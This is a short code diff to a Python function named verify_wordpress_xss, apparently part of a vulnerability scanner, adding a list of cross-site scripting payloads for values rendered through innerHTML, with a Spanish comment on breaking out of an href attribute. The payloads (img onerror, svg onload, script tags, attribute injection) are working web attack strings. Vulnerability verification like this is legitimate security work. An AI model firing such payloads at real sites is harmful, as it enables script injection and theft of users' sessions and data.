@@ -4309,6 +4309,15 @@ def verify_wordpress_xss(
                     f"\"><img src=x onerror=\"{js}\">",
                     f"\"><svg onload=\"{js}\">",
                 ],
+                # Valor se inserta via template literal en .html()/innerHTML:
+                # `<a href="${siteUrl}${value['str_url']}"...` → romper href + inyectar tag
+                "js_innerHTML": [
+                    f"\"><img src=x onerror=\"{js}\">",
+                    f"'><img src=x onerror=\"{js}\">",
+                    f"\"><svg onload=\"{js}\">",
+                    f"\"><script>{js}</script>",
+                    f"\" onmouseover=\"{js}\" x=\"",
+                ],
             }
             _priority = _CTX_PAYLOADS.get(render_context, [])
             if _priority:
